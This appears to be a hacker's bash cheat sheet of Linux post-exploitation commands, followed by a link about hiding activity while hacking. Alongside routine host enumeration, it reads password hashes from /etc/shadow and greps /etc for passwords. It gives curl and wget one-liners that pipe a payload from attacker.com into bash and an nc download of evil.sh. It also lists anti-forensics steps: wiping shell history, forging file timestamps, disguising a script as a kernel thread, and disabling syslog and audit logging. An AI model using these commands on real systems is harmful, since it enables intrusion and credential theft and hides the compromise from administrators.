## **system**
```bash
# system release 
ls /etc/*-release
cat /etc/os-release
hostname

#users
cat /etc/passwd
cat /etc/group
#hashes
sudo cat /etc/shadow
# who is logged in 
who
# who is logged in and what is doing:
w
# real and effective user and group IDS:
id
# who accessed system recently
last
# 
ls -lh /var/mail/

# installed apps:
ls -lh /usr/bin/
ls -lh /sbin/
# debian installed packages
dpkg -l

# list open files
lsof
sudo lsof -i
sudo lsof -i PORT

# running processes
ps
# running processes as tree
ps axjf

# ip addresses
ip a s

# programs listening on tcp
sudo netstat -plt
# tcp and udp
sudo netstat -atupn

# DNS 
cat /etc/resolv.conf

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# world-writable files
find / -type f -perm -2 -ls 2>/dev/null

# find all hidden files
find / -name ".*" 2>/dev/null

#local network scan
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "64 bytes" & done

#download file without curl/wget
echo "GET /evil.sh HTTP/1.0\r\n" | nc yourhost.com 80 > evil.sh

# get all users crons
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done

# find all files with keyword
grep -Ri 'password' /etc 2>/dev/null

# download and execute script in memory
curl http://attacker.com/payload.sh | bash
wget -qO- http://attacker.com/payload.sh | bash

# clean bash history
history -c && history -w && unset HISTFILE
# modify timestamp
touch -r /bin/ls malicious_file.sh
touch -t 202001011200.00 yourscript.sh
# make script look like kernel thread
exec -a "[kworker/0:1H]" ./evil_script.sh
# syslog disable 
service rsyslog stop
# audit log disable
auditctl -e 0
```

hiding activity
https://medium.verylazytech.com/stealth-mode-10-bash-tricks-to-stay-hidden-while-hacking-6df8fdeabe3d